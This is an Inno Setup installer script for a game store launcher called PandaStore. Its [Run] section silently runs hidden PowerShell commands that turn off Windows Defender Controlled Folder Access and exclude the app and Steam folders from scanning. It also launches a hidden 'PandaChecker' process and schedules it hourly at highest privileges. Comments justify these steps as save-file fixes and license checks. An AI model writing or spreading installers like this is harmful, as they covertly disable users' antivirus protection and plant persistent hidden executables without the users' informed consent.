[Setup]
AppName=PandaStore Launcher
AppVersion=2.4.37
AppPublisher=PandaStore Official
AppPublisherURL=https://pandastoreupdate.web.app
DefaultDirName={autopf}\PandaStore
DefaultGroupName=PandaStore
OutputDir=.\Publish
OutputBaseFilename=PandaStoreSetup
SetupIconFile=app.ico
UninstallDisplayIcon={app}\PandaStoreLauncher.exe
WizardStyle=modern
Compression=lzma2/ultra64
SolidCompression=yes
PrivilegesRequired=admin
DisableDirPage=yes
DisableProgramGroupPage=yes
; CloseApplications ensures running processes are terminated so files can be overwritten cleanly
CloseApplications=force
RestartApplications=no

[Languages]
Name: "spanish"; MessagesFile: "compiler:Languages\Spanish.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: checkablealone

[Files]
Source: ".\Publish\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs; Excludes: "PandaStoreSetup.exe"

[Icons]
Name: "{group}\PandaStore Launcher"; Filename: "{app}\PandaStoreLauncher.exe"
Name: "{autodesktop}\PandaStore Launcher"; Filename: "{app}\PandaStoreLauncher.exe"; Tasks: desktopicon

[Run]
; Disable Controlled Folder Access to allow games to write save files in Documents without error
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue"""; Flags: runhidden

; Add Defender Exclusion for app directory and Steam
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '{app}','C:\Program Files (x86)\Steam','C:\Program Files\Steam' -ErrorAction SilentlyContinue"""; Flags: runhidden

; Start PandaChecker background guard immediately
Filename: "{app}\PandaChecker.exe"; Flags: nowait runhidden

; Create Scheduled Task for PandaChecker (Runs every hour silently)
Filename: "schtasks.exe"; Parameters: "/Create /F /TN ""PandaStore License Checker"" /TR """"{app}\PandaChecker.exe"""" /SC DAILY /ST 09:00 /RI 60 /DU 24:00 /RL HIGHEST"; Flags: runhidden

; Launch Launcher on finish (only when interactive, skipped on silent/auto-update)
Filename: "{app}\PandaStoreLauncher.exe"; Flags: nowait postinstall skipifsilent

[UninstallRun]
; Remove Scheduled Task on uninstall
Filename: "schtasks.exe"; Parameters: "/Delete /TN ""PandaStore License Checker"" /F"; Flags: runhidden

[UninstallDelete]
Type: filesandordirs; Name: "{app}"

[Code]
function InitializeSetup(): Boolean;
var
  ErrorCode: Integer;
begin
  // Forzar terminacion inmediata de ejecutables para asegurar que ningun archivo este bloqueado
  Exec('taskkill.exe', '/F /T /IM PandaStoreLauncher.exe /IM PandaChecker.exe /IM PandaStoreActivator.exe', '', SW_HIDE, ewWaitUntilTerminated, ErrorCode);
  Sleep(600);
  Result := True;
end;

